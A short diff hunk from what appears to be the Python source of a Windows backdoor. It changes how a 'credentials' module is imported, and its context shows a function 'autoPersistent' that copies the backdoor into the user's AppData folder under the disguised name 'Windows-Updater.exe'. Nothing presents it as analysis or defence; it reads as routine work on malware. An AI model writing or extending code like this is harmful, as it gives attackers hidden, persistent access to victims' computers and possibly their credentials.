@@ -16,7 +16,7 @@ import threading
 import json
 import ctypes
 import random
-import credentials
+import libraries.credentials as credentials
 
 def autoPersistent():
     backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
